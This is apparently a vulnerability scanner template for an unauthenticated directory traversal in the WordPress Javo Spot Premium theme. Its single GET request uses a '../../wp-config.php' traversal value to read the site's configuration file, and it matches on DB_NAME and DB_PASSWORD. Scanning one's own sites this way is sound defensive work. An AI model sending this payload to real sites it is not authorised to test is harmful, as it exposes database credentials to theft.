id: wp-spot-premium-lfi
name: WordPress Javo Spot Premium Theme - Unauthenticated Directory Traversal
severity: high
confidence: tentative
description: WordPress Javo Spot Premium Theme `wp-config` was discovered via local file inclusion. This file is remotely
  accessible and its content available for reading.
reference: https://wpscan.com/vulnerability/2d465fc4-d4fa-43bb-9c0d-71dcc3ee4eab
tags:
- wordpress
- backup
- wpscan
- vuln
requests:
- method: GET
  path: /wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery
  matchers:
  - type: body
    words:
    - DB_NAME
    - DB_PASSWORD
  - type: status
    status:
    - 200
  condition: and
